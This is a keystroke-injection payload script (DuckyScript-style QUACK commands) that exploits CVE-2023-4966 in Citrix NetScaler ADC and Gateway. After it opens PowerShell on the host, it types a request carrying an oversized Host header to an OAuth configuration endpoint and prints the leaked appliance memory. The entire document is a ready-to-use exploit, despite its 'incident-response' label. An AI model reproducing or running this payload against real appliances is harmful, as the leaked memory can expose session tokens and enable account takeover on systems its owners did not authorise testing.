##################################################################################
#                                                                                #
# Title       : Exploit Citrix NetScaler ADC and Gateway through CVE-2023-4966   #
# Author      : Aleff                                                            #
# Version	  : 1.0                                                              #
# Category	  : incident-response                                                #
# Target	  : Citrix NetScaler ADV; NetScaler Gateway                          #
#                                                                                #
##################################################################################

ATTACKMODE HID

QUACK REM VARIABLES
#1) Define replacing into the HOSTNAME var your target, so put here the Citrix ADC / Gateway target, excluding the protocol.
HOSTNAME='192.168.1.200'

QUACK DELAY 1500
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell
QUACK ENTER
QUACK DELAY 1000
QUACK STRING \$header_value = 'a' * 24576
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$header_value = \$header_value -replace \"\n\", \"\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers=\"-H 'Host:\$header_value'\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$headers = @{'Host' = \$header_value}
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$uri = \"https://$HOSTNAME/oauth/idp/.well-known/openid-configuration\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$response = Invoke-RestMethod -Uri \$uri -Headers \$headers -Method GET -TimeoutSec 10
QUACK ENTER
QUACK DELAY 500
QUACK STRING if (\$response.Substring(0, 3) -eq \"200\") {
QUACK ENTER
QUACK DELAY 500
QUACK STRING Write-Host \"--- Dumped memory ---\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING \$response.Substring(131050)  # 131051 - 1
QUACK ENTER
QUACK DELAY 500
QUACK STRING Write-Host \"---      End      ---\"
QUACK ENTER
QUACK DELAY 500
QUACK STRING } else {
QUACK ENTER
QUACK DELAY 500
QUACK STRING Write-Host \"Could not dump memory\"}
QUACK ENTER
